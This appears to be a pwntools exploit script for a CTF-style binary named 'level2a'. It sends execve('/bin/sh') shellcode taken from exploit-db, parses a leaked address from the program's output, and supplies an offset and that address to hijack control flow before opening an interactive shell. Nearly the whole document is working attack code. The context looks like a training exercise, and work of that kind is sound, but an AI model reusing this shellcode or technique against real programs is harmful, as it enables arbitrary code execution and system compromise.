from pwn import *

SHELLCODE = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05" # Shellcode from https://www.exploit-db.com/exploits/42179
OFFSET = 120

level2b = process("../release/level2a")

print(level2b.readline())

try:
    level2b.sendline(SHELLCODE)
except Exception as e:
    print(e)

msg = level2b.readline()

print(msg)


import re
addr = re.search(b"0x[a-f0-9]+", msg).group(0) # Isloate the address we need to write
addr = int(addr, base=16) # Convert the address to an integer
print(level2b.readline())



print("The offset is {}".format(OFFSET))
try:
    level2b.sendline("{}".format(OFFSET).encode("utf-8")) # Send the offset to the program
except Exception as e:
    print(e)
    
print(level2b.readline())

try:
    print(level2b.sendline("{}".format(addr).encode("utf-8"))) # Send the address to the program
except Exception as e:
    print(e)
print(level2b.readline())

level2b.interactive()



